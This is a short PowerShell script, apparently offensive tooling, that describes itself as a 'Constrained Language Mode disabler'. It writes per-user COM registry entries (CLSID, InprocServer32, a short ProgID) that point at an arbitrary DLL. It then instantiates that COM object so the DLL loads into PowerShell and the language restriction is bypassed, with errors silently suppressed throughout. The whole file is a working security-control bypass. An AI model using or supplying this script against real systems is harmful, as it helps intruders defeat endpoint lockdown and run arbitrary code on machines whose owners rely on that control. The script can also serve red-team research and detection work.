$dllPath = "C:\Users\xpn\Desktop\test.dll"
$uuid = "{72C24DD5-D70A-438B-8A42-98424B88D3AD}"

New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS -erroraction 'silentlycontinue' | Out-Null

$matches = whoami /user | select-string -Pattern "(S-1-5-[-0-9]+)" -all | select -ExpandProperty Matches
$sid = $matches.value

$key = 'HKU:\{0}_classes' -f $sid

# Adding our InProcServer
New-Item -Path $key -Name CLSID -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\CLSID\' -f $sid
New-Item -Path $key -Name $uuid -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, $uuid
New-Item -Path $key -Name 'InprocServer32' -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\CLSID\{1}\InprocServer32' -f $sid, $uuid
New-ItemProperty -Path $key -Name "(Default)" -Value $dllPath -PropertyType String -Force -erroraction 'silentlycontinue' | Out-Null

# Adding our short name
$key = 'HKU:\{0}_classes' -f $sid
New-Item -Path $key -Name xpn -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\xpn' -f $sid
New-Item -Path $key -Name CLSID -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\xpn\CLSID' -f $sid
New-ItemProperty -Path $key -Name "(Default)" -Value $uuid -PropertyType String -Force -erroraction 'silentlycontinue' | Out-Null

Write-Host "@_xpn_ Constrained Language Mode disabler"
Write-Host "[*] Starting..."

try {
new-object -ComObject xpn -erroraction 'silentlycontinue' | Out-Null
} catch {
}
Write-Host "[*] Done, Constrained Language Mode should now be disabled" 
